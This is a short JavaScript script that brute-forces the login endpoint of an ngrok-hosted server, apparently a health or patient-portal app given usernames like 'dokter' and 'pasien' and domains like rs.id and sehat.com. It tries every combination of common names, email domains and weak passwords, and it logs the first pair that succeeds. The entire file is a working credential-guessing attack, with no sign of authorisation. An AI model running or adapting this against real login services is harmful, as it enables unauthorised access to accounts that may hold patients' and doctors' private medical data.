const API = 'https://perky-drastic-gleeful.ngrok-free.dev';
const domains = ['gmail.com', 'sehat.com', 'rs.id', 'rumahsakit.com', 'digitalhealth.id', 'stitch.com', 'health.id', 'care.id', 'hospital.com'];
const users = ['admin', 'dokter', 'pasien', 'user', 'test', 'budi', 'siti', 'dr.budi', 'dr.siti', 'john', 'jane', 'doctor', 'patient'];
const passws = ['123456', 'password', 'admin', 'admin123', 'Password123!', '12345678', 'sehat123', 'password123', '123456789'];

async function testLogin() {
  let count = 0;
  for (const u of users) {
    for (const d of domains) {
      const email = `${u}@${d}`;
      for (const p of passws) {
        count++;
        try {
          const res = await fetch(API + '/api/auth/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'true' },
            body: JSON.stringify({ email, password: p })
          });
          const txt = await res.text();
          if (res.status === 200) {
            console.log('SUCCESS!!! Email:', email, 'Password:', p, 'Response:', txt);
            return;
          }
        } catch(e) {
          console.error(e.message);
        }
      }
    }
  }
  console.log(`Tested ${count} combinations. No match found.`);
}
testLogin();
